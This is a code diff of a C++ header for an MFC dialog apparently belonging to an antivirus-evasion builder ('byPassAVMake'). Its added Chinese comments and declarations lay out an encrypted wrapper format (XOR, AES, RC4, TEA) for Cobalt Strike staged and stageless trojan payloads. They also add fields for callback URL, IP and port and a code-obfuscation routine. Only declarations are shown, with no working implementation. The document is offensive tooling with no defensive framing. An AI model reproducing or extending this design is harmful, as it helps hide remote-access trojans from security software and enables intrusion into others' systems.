@@ -5,12 +5,35 @@
 #pragma once
 #include"MyListCtrl.h"
 
-typedef struct _ShellCode
-{
-	CString strBinFile;
-	ByteBuffer bin;
-}ShellCode;
 
+/*****数据包封装
+* |STu8		|STu32			|STu8*		|
+* |加密类型	|加密数据长度	|加密数据	|
+******/
+
+//加密类型
+#define H_ENC_XOR	STu8(0xB1)
+#define H_ENC_AES	STu8(0xB2)
+#define H_ENC_RC4	STu8(0xB3)
+#define H_ENC_TEA	STu8(0xB4)
+
+/*****加密数据封装
+* |STu8		|STu32			|STu8*		|
+* |数据类型	|数据长度		|payload数据|
+******/
+
+//payload数据类型
+#define P_TYPE_STAGE		STu8(0xA0)
+#define P_TYPE_STAGELESSURL	STu8(0xA1)
+
+/*****stage payload
+* Conbalt strike分离木马方式生成的阶段一木马
+******/
+
+/*****stageless url
+* Conbalt strike分离木马方式生成的阶段二木马url
+* 根据阶段一木马解析得来
+******/
 
 // CbyPassAVMakeDlg 对话框
 class CbyPassAVMakeDlg : public CDialogEx
@@ -49,13 +72,18 @@ public:
 	PEMake mPEMake;
 	CEdit mFileBin;
 	CEdit mDstFile;
+	CEdit mStagelessURL;
+	CEdit mStagelessIP;
 public:
 	void OnSaveAs();
 	BOOL InitDisaDate(STu8*, STu32);
+	void ConfusionCodes(STu8*, STu32, STu8**, STu32*);
 	void encrypt_tea(unsigned long* in, unsigned long* key, unsigned long* out);
 	void decrypt_tea(unsigned long* in, unsigned long* key, unsigned long* out);
 	void tea_encrypt(unsigned char * v, unsigned int len,unsigned char * key,unsigned char ** out,unsigned int * outlen);
 	void tea_decrypt(unsigned char* v, unsigned int len, unsigned char* key, unsigned char** out, unsigned int* outlen);
+	afx_msg void OnBnClickedButton5();
+	CEdit mPort;
 };
 
 
